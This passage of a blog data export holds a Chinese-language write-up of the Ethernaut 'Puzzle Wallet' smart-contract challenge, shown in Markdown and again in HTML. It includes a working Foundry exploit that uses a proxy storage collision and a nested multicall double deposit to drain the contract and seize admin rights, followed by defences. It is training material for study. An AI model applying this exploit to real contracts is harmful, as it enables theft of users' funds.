**对齐存储布局**: 在使用代理模式时，必须确保代理合约和逻辑合约的存储布局是兼容的，以避免存储冲突。在代理合约中为未来的升级保留一些空的存储槽是一种常见的做法。\n2.  **修复 `multicall` 漏洞**: `multicall` 中的重入保护应该使用状态变量而不是局部变量。将 `depositCalled` 声明为合约的状态变量，并在 `multicall` 开始时设置，结束时清除，可以防止嵌套调用绕过检查。\n3.  **原子化状态变更**: 避免在一次函数调用中混合多种复杂逻辑（如存款和任意 `delegatecall`）。将功能分解为更小、更原子化的函数可以减少意外的交互。\n\n## 🎯 总结\n\n**核心概念**:\n-   **代理存储冲突**: `delegatecall` 的核心风险之一。代理和逻辑合约的存储变量必须精确对齐，否则一个合约的变量可能会被另一个合约的函数意外地修改。\n-   **嵌套 `delegatecall`**: 对 `delegatecall` 的嵌套调用会继承原始调用的上下文（如 `msg.sender`, `msg.value`），但会创建新的局部变量作用域，这可能被用来绕过基于局部变量的安全检查。\n\n**攻击向量**:\n-   利用存储冲突，通过调用一个看似无关的函数（`proposeNewAdmin`）来修改一个关键的状态变量（`owner`）。\n-   利用 `multicall` 中基于局部变量的重入保护缺陷，通过嵌套调用实现双重记账，从而窃取合约资金。\n\n**防御策略**:\n-   仔细规划和验证代理合约的存储布局。\n-   使用状态变量来实现重入保护，而不是局部变量。\n\n## 📚 参考资料\n\n-   [OpenZeppelin: Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)\n-   [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)","source":"_posts/ethernaut-level-24-puzzle-wallet.md","raw":"---\ntitle: 'Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞'\ndate: 2025-01-25 17:05:00\nupdated: 2025-01-25 17:05:00\ncategories:\n  - Ethernaut 系列\n  - 高级攻击篇 (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Proxy\n  - Storage Collision\n  - delegatecall\n  - multicall\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入剖析代理合约（Proxy）中的存储布局冲突问题，并利用 `multicall` 函数中的逻辑漏洞绕过重入保护。通过一系列精心设计的嵌套调用，最终提升为代理合约的 `admin`，掌握 Puzzle Wallet 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞\n\n> **关卡链接**: [Ethernaut Level 24 - Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)  \n> **攻击类型**: 存储布局冲突 / 逻辑漏洞  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n本关的目标是成为 `PuzzleProxy` 合约的 `admin`。\n\n![Puzzle Wallet Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)\n\n## 🔍 漏洞分析\n\n这是一个涉及代理合约（Proxy）的复杂挑战，包含了多个漏洞的组合利用。我们需要分步解决几个子问题。\n\n### 漏洞 1: 代理存储布局冲突\n\n首先，我们检查 `PuzzleProxy` (代理) 和 `PuzzleWallet` (逻辑) 合约的存储布局。\n\n**`PuzzleProxy` 的存储:**\n```solidity\ncontract PuzzleProxy is Proxy {\n    address public pendingAdmin; // slot 0\n    address public admin;      // slot 1\n    // ...\n}\n```\n\n**`PuzzleWallet` 的存储:**\n```solidity\ncontract PuzzleWallet is Ownable {\n    address public owner;      // slot 0 (继承自 Ownable)\n    uint256 public maxBalance; // slot 1\n    mapping(address => bool) public whitelisted; // slot 2\n    // ...\n}\n```\n\n由于代理模式使用 `delegatecall`，`PuzzleWallet` 的代码会直接操作 `PuzzleProxy` 的存储。这就导致了存储槽的冲突：\n\n-   `PuzzleProxy` 的 `pendingAdmin` (slot 0) 实际上对应 `PuzzleWallet` 的 `owner` (slot 0)。\n-   `PuzzleProxy` 的 `admin` (slot 1) 实际上对应 `PuzzleWallet` 的 `maxBalance` (slot 1)。\n\n我们的最终目标是成为 `PuzzleProxy` 的 `admin`。根据存储冲突，**我们只需要将 `PuzzleWallet` 的 `maxBalance` 设置为我们的地址即可**。\n\n### 漏洞 2: 成为 `owner` 并加入白名单\n\n要调用 `setMaxBalance()`，我们必须是白名单用户。要加入白名单，我们必须是 `PuzzleWallet` 的 `owner`。\n\n-   `PuzzleWallet` 的 `owner` 存储在 slot 0。\n-   `PuzzleProxy` 的 `proposeNewAdmin()` 函数可以修改 `pendingAdmin`，也就是修改 slot 0。\n\n因此，第一步是通过调用 `proxy.proposeNewAdmin(player_address)` 来将 `wallet.owner` 设置为我们自己的地址。\n\n成为 `owner` 后，我们就可以调用 `wallet.addToWhitelist(player_address)` 将自己加入白名单。\n\n### 漏洞 3: `multicall` 逻辑漏洞与清空合约余额\n\n现在我们是白名单用户了，但 `setMaxBalance()` 还有一个要求：`require(address(this).balance == 0, \"Contract balance is not 0\")`。合约在部署时被存入了 0.001 ether，我们需要想办法将合约余额清空。\n\n`execute()` 函数可以提款，但我们只能提出我们存入的金额。问题在于合约中已有的 0.001 ether。\n\n关键在于 `multicall()` 函数：\n\n```solidity\nfunction multicall(bytes[] calldata data) external payable onlyWhitelisted {\n    bool depositCalled = false;\n    for (uint i = 0; i < data.length; i++) {\n        // ...\n        if (selector == this.deposit.selector) {\n            require(!depositCalled, \"Deposit can only be called once\");\n            depositCalled = true;\n        }\n        (bool success, ) = address(this).delegatecall(data[i]);\n        // ...\n    }\n}\n```\n\n函数通过 `depositCalled` 标志位来防止在一次 `multicall` 中多次调用 `deposit()`。但是，这个保护措施是有缺陷的。`depositCalled` 是一个局部变量，它的作用域仅限于单次 `multicall` 调用。如果我们**在一个 `multicall` 调用中嵌套另一个 `multicall` 调用**，那么内部的 `multicall` 会有自己的、全新的 `depositCalled` 标志位。\n\n这允许我们绕过检查，实现“双重存款”：\n\n1.  我们向 `multicall` 发送 0.001 ether。\n2.  `multicall` 的第一个调用是 `deposit()`。这会把我们的 `msg.value` (0.001 ether) 存入，并将我们的余额记录为 0.001 ether。\n3.  `multicall` 的第二个调用是**对 `multicall` 自身的嵌套调用**。在这个嵌套调用中，我们再次调用 `deposit()`。\n4.  由于 `delegatecall` 的特性，`msg.value` 在嵌套调用中保持不变。因此，第二次 `deposit()` 会再次将同一个 `msg.value` (0.001 ether) 存入，使我们的记录余额变为 0.002 ether。\n\n我们只发送了 0.001 ether，但在合约中的存款记录却是 0.002 ether。现在，我们调用 `execute(player, 0.002 ether, \"\")`，就可以提走合约中所有的资金（我们存入的0.001 + 合约原有的0.001）。\n\n### 最终攻击流程\n\n1.  **成为 `owner`**: 调用 `proxy.proposeNewAdmin(player)`。\n2.  **加入白名单**: 调用 `wallet.addToWhitelist(player)`。\n3.  **双重存款**: 构造一个嵌套的 `multicall` 调用，发送 0.001 ether，使自己的存款记录变为 0.002 ether。\n4.  **清空合约**: 调用 `wallet.execute(player, 0.002 ether, \"\")` 提走所有资金。\n5.  **成为 `admin`**: 调用 `wallet.setMaxBalance(uint256(uint160(player)))`，将 `maxBalance` (即 `admin`) 设置为我们的地址。\n\n## 💻 Foundry 实现\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/24_PuzzleWallet.sol\";\n\ncontract PuzzleWalletTest is Test {\n    PuzzleProxy proxy;\n    address player;\n    PuzzleWallet wallet;\n\n    function setUp() public {\n        player = vm.addr(1);\n\n        // 部署逻辑合约和代理合约\n        PuzzleWallet puzzleWallet = new PuzzleWallet();\n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);\n        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);\n        wallet = PuzzleWallet(address(proxy));\n\n        // 初始设置，存入 0.001 ether\n        vm.deal(address(this), 0.001 ether);\n        wallet.addToWhitelist(address(this));\n        wallet.deposit{value: 0.001 ether}();\n    }\n\n    function testPuzzleWalletAttack() public {\n        vm.deal(player, 0.001 ether);\n        vm.startPrank(player);\n\n        // 1. 成为 owner\n        proxy.proposeNewAdmin(player);\n\n        // 2. 加入白名单\n        wallet.addToWhitelist(player);\n\n        // 3. 构造嵌套 multicall 以实现双重存款\n        bytes[] memory nestedCalls = new bytes[](1);\n        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory calls = new bytes[](2);\n        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);\n        \n        // 发送 0.001 ether，但存款两次\n        wallet.multicall{value: 0.001 ether}(calls);\n\n        // 4. 提走所有资金 (0.002 ether)\n        wallet.execute(player, 0.002 ether, \"\");\n\n        // 5. 成为 admin\n        wallet.setMaxBalance(uint256(uint160(player)));\n\n        // 验证成功\n        assertEq(proxy.admin(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n1.  **对齐存储布局**: 在使用代理模式时，必须确保代理合约和逻辑合约的存储布局是兼容的，以避免存储冲突。在代理合约中为未来的升级保留一些空的存储槽是一种常见的做法。\n2.  **修复 `multicall` 漏洞**: `multicall` 中的重入保护应该使用状态变量而不是局部变量。将 `depositCalled` 声明为合约的状态变量，并在 `multicall` 开始时设置，结束时清除，可以防止嵌套调用绕过检查。\n3.  **原子化状态变更**: 避免在一次函数调用中混合多种复杂逻辑（如存款和任意 `delegatecall`）。将功能分解为更小、更原子化的函数可以减少意外的交互。\n\n## 🎯 总结\n\n**核心概念**:\n-   **代理存储冲突**: `delegatecall` 的核心风险之一。代理和逻辑合约的存储变量必须精确对齐，否则一个合约的变量可能会被另一个合约的函数意外地修改。\n-   **嵌套 `delegatecall`**: 对 `delegatecall` 的嵌套调用会继承原始调用的上下文（如 `msg.sender`, `msg.value`），但会创建新的局部变量作用域，这可能被用来绕过基于局部变量的安全检查。\n\n**攻击向量**:\n-   利用存储冲突，通过调用一个看似无关的函数（`proposeNewAdmin`）来修改一个关键的状态变量（`owner`）。\n-   利用 `multicall` 中基于局部变量的重入保护缺陷，通过嵌套调用实现双重记账，从而窃取合约资金。\n\n**防御策略**:\n-   仔细规划和验证代理合约的存储布局。\n-   使用状态变量来实现重入保护，而不是局部变量。\n\n## 📚 参考资料\n\n-   [OpenZeppelin: Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)\n-   [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)","slug":"ethernaut-level-24-puzzle-wallet","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpl001tbf5qd5j7613o","content":"<h1 id=\"🎯-Ethernaut-Level-24-Puzzle-Wallet-代理存储冲突与嵌套调用漏洞\"><a href=\"#🎯-Ethernaut-Level-24-Puzzle-Wallet-代理存储冲突与嵌套调用漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞\"></a>🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/24\">Ethernaut Level 24 - Puzzle Wallet</a><br><strong>攻击类型</strong>: 存储布局冲突 &#x2F; 逻辑漏洞<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是成为 <code>PuzzleProxy</code> 合约的 <code>admin</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg\" alt=\"Puzzle Wallet Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这是一个涉及代理合约（Proxy）的复杂挑战，包含了多个漏洞的组合利用。我们需要分步解决几个子问题。</p>\n<h3 id=\"漏洞-1-代理存储布局冲突\"><a href=\"#漏洞-1-代理存储布局冲突\" class=\"headerlink\" title=\"漏洞 1: 代理存储布局冲突\"></a>漏洞 1: 代理存储布局冲突</h3><p>首先，我们检查 <code>PuzzleProxy</code> (代理) 和 <code>PuzzleWallet</code> (逻辑) 合约的存储布局。</p>\n<p><strong><code>PuzzleProxy</code> 的存储:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleProxy is Proxy &#123;</span><br><span class=\"line\">    address public pendingAdmin; // slot 0</span><br><span class=\"line\">    address public admin;      // slot 1</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong><code>PuzzleWallet</code> 的存储:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleWallet is Ownable &#123;</span><br><span class=\"line\">    address public owner;      // slot 0 (继承自 Ownable)</span><br><span class=\"line\">    uint256 public maxBalance; // slot 1</span><br><span class=\"line\">    mapping(address =&gt; bool) public whitelisted; // slot 2</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于代理模式使用 <code>delegatecall</code>，<code>PuzzleWallet</code> 的代码会直接操作 <code>PuzzleProxy</code> 的存储。这就导致了存储槽的冲突：</p>\n<ul>\n<li><code>PuzzleProxy</code> 的 <code>pendingAdmin</code> (slot 0) 实际上对应 <code>PuzzleWallet</code> 的 <code>owner</code> (slot 0)。</li>\n<li><code>PuzzleProxy</code> 的 <code>admin</code> (slot 1) 实际上对应 <code>PuzzleWallet</code> 的 <code>maxBalance</code> (slot 1)。</li>\n</ul>\n<p>我们的最终目标是成为 <code>PuzzleProxy</code> 的 <code>admin</code>。根据存储冲突，<strong>我们只需要将 <code>PuzzleWallet</code> 的 <code>maxBalance</code> 设置为我们的地址即可</strong>。</p>\n<h3 id=\"漏洞-2-成为-owner-并加入白名单\"><a href=\"#漏洞-2-成为-owner-并加入白名单\" class=\"headerlink\" title=\"漏洞 2: 成为 owner 并加入白名单\"></a>漏洞 2: 成为 <code>owner</code> 并加入白名单</h3><p>要调用 <code>setMaxBalance()</code>，我们必须是白名单用户。要加入白名单，我们必须是 <code>PuzzleWallet</code> 的 <code>owner</code>。</p>\n<ul>\n<li><code>PuzzleWallet</code> 的 <code>owner</code> 存储在 slot 0。</li>\n<li><code>PuzzleProxy</code> 的 <code>proposeNewAdmin()</code> 函数可以修改 <code>pendingAdmin</code>，也就是修改 slot 0。</li>\n</ul>\n<p>因此，第一步是通过调用 <code>proxy.proposeNewAdmin(player_address)</code> 来将 <code>wallet.owner</code> 设置为我们自己的地址。</p>\n<p>成为 <code>owner</code> 后，我们就可以调用 <code>wallet.addToWhitelist(player_address)</code> 将自己加入白名单。</p>\n<h3 id=\"漏洞-3-multicall-逻辑漏洞与清空合约余额\"><a href=\"#漏洞-3-multicall-逻辑漏洞与清空合约余额\" class=\"headerlink\" title=\"漏洞 3: multicall 逻辑漏洞与清空合约余额\"></a>漏洞 3: <code>multicall</code> 逻辑漏洞与清空合约余额</h3><p>现在我们是白名单用户了，但 <code>setMaxBalance()</code> 还有一个要求：<code>require(address(this).balance == 0, &quot;Contract balance is not 0&quot;)</code>。合约在部署时被存入了 0.001 ether，我们需要想办法将合约余额清空。</p>\n<p><code>execute()</code> 函数可以提款，但我们只能提出我们存入的金额。问题在于合约中已有的 0.001 ether。</p>\n<p>关键在于 <code>multicall()</code> 函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class=\"line\">    bool depositCalled = false;</span><br><span class=\"line\">    for (uint i = 0; i &lt; data.length; i++) &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">        if (selector == this.deposit.selector) &#123;</span><br><span class=\"line\">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class=\"line\">            depositCalled = true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>函数通过 <code>depositCalled</code> 标志位来防止在一次 <code>multicall</code> 中多次调用 <code>deposit()</code>。但是，这个保护措施是有缺陷的。<code>depositCalled</code> 是一个局部变量，它的作用域仅限于单次 <code>multicall</code> 调用。如果我们<strong>在一个 <code>multicall</code> 调用中嵌套另一个 <code>multicall</code> 调用</strong>，那么内部的 <code>multicall</code> 会有自己的、全新的 <code>depositCalled</code> 标志位。</p>\n<p>这允许我们绕过检查，实现“双重存款”：</p>\n<ol>\n<li>我们向 <code>multicall</code> 发送 0.001 ether。</li>\n<li><code>multicall</code> 的第一个调用是 <code>deposit()</code>。这会把我们的 <code>msg.value</code> (0.001 ether) 存入，并将我们的余额记录为 0.001 ether。</li>\n<li><code>multicall</code> 的第二个调用是<strong>对 <code>multicall</code> 自身的嵌套调用</strong>。在这个嵌套调用中，我们再次调用 <code>deposit()</code>。</li>\n<li>由于 <code>delegatecall</code> 的特性，<code>msg.value</code> 在嵌套调用中保持不变。因此，第二次 <code>deposit()</code> 会再次将同一个 <code>msg.value</code> (0.001 ether) 存入，使我们的记录余额变为 0.002 ether。</li>\n</ol>\n<p>我们只发送了 0.001 ether，但在合约中的存款记录却是 0.002 ether。现在，我们调用 <code>execute(player, 0.002 ether, &quot;&quot;)</code>，就可以提走合约中所有的资金（我们存入的0.001 + 合约原有的0.001）。</p>\n<h3 id=\"最终攻击流程\"><a href=\"#最终攻击流程\" class=\"headerlink\" title=\"最终攻击流程\"></a>最终攻击流程</h3><ol>\n<li><strong>成为 <code>owner</code></strong>: 调用 <code>proxy.proposeNewAdmin(player)</code>。</li>\n<li><strong>加入白名单</strong>: 调用 <code>wallet.addToWhitelist(player)</code>。</li>\n<li><strong>双重存款</strong>: 构造一个嵌套的 <code>multicall</code> 调用，发送 0.001 ether，使自己的存款记录变为 0.002 ether。</li>\n<li><strong>清空合约</strong>: 调用 <code>wallet.execute(player, 0.002 ether, &quot;&quot;)</code> 提走所有资金。</li>\n<li><strong>成为 <code>admin</code></strong>: 调用 <code>wallet.setMaxBalance(uint256(uint160(player)))</code>，将 <code>maxBalance</code> (即 <code>admin</code>) 设置为我们的地址。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/24_PuzzleWallet.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PuzzleWalletTest is Test &#123;</span><br><span class=\"line\">    PuzzleProxy proxy;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    PuzzleWallet wallet;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署逻辑合约和代理合约</span><br><span class=\"line\">        PuzzleWallet puzzleWallet = new PuzzleWallet();</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);</span><br><span class=\"line\">        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);</span><br><span class=\"line\">        wallet = PuzzleWallet(address(proxy));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 初始设置，存入 0.001 ether</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        wallet.addToWhitelist(address(this));</span><br><span class=\"line\">        wallet.deposit&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testPuzzleWalletAttack() public &#123;</span><br><span class=\"line\">        vm.deal(player, 0.001 ether);</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 成为 owner</span><br><span class=\"line\">        proxy.proposeNewAdmin(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 加入白名单</span><br><span class=\"line\">        wallet.addToWhitelist(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 构造嵌套 multicall 以实现双重存款</span><br><span class=\"line\">        bytes[] memory nestedCalls = new bytes[](1);</span><br><span class=\"line\">        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes[] memory calls = new bytes[](2);</span><br><span class=\"line\">        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\">        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 发送 0.001 ether，但存款两次</span><br><span class=\"line\">        wallet.multicall&#123;value: 0.001 ether&#125;(calls);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 提走所有资金 (0.002 ether)</span><br><span class=\"line\">        wallet.execute(player, 0.002 ether, &quot;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. 成为 admin</span><br><span class=\"line\">        wallet.setMaxBalance(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证成功</span><br><span class=\"line\">        assertEq(proxy.admin(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>对齐存储布局</strong>: 在使用代理模式时，必须确保代理合约和逻辑合约的存储布局是兼容的，以避免存储冲突。在代理合约中为未来的升级保留一些空的存储槽是一种常见的做法。</li>\n<li><strong>修复 <code>multicall</code> 漏洞</strong>: <code>multicall</code> 中的重入保护应该使用状态变量而不是局部变量。将 <code>depositCalled</code> 声明为合约的状态变量，并在 <code>multicall</code> 开始时设置，结束时清除，可以防止嵌套调用绕过检查。</li>\n<li><strong>原子化状态变更</strong>: 避免在一次函数调用中混合多种复杂逻辑（如存款和任意 <code>delegatecall</code>）。将功能分解为更小、更原子化的函数可以减少意外的交互。</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><strong>代理存储冲突</strong>: <code>delegatecall</code> 的核心风险之一。代理和逻辑合约的存储变量必须精确对齐，否则一个合约的变量可能会被另一个合约的函数意外地修改。</li>\n<li><strong>嵌套 <code>delegatecall</code></strong>: 对 <code>delegatecall</code> 的嵌套调用会继承原始调用的上下文（如 <code>msg.sender</code>, <code>msg.value</code>），但会创建新的局部变量作用域，这可能被用来绕过基于局部变量的安全检查。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用存储冲突，通过调用一个看似无关的函数（<code>proposeNewAdmin</code>）来修改一个关键的状态变量（<code>owner</code>）。</li>\n<li>利用 <code>multicall</code> 中基于局部变量的重入保护缺陷，通过嵌套调用实现双重记账，从而窃取合约资金。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>仔细规划和验证代理合约的存储布局。</li>\n<li>使用状态变量来实现重入保护，而不是局部变量。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable\">OpenZeppelin: Writing Upgradeable Contracts</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-112\">SWC-112: Delegatecall to Untrusted Callee</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-24-Puzzle-Wallet-代理存储冲突与嵌套调用漏洞\"><a href=\"#🎯-Ethernaut-Level-24-Puzzle-Wallet-代理存储冲突与嵌套调用漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞\"></a>🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/24\">Ethernaut Level 24 - Puzzle Wallet</a><br><strong>攻击类型</strong>: 存储布局冲突 &#x2F; 逻辑漏洞<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是成为 <code>PuzzleProxy</code> 合约的 <code>admin</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg\" alt=\"Puzzle Wallet Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这是一个涉及代理合约（Proxy）的复杂挑战，包含了多个漏洞的组合利用。我们需要分步解决几个子问题。</p>\n<h3 id=\"漏洞-1-代理存储布局冲突\"><a href=\"#漏洞-1-代理存储布局冲突\" class=\"headerlink\" title=\"漏洞 1: 代理存储布局冲突\"></a>漏洞 1: 代理存储布局冲突</h3><p>首先，我们检查 <code>PuzzleProxy</code> (代理) 和 <code>PuzzleWallet</code> (逻辑) 合约的存储布局。</p>\n<p><strong><code>PuzzleProxy</code> 的存储:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleProxy is Proxy &#123;</span><br><span class=\"line\">    address public pendingAdmin; // slot 0</span><br><span class=\"line\">    address public admin;      // slot 1</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong><code>PuzzleWallet</code> 的存储:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleWallet is Ownable &#123;</span><br><span class=\"line\">    address public owner;      // slot 0 (继承自 Ownable)</span><br><span class=\"line\">    uint256 public maxBalance; // slot 1</span><br><span class=\"line\">    mapping(address =&gt; bool) public whitelisted; // slot 2</span><br><span class=\"line\">    // ...</span><br><span 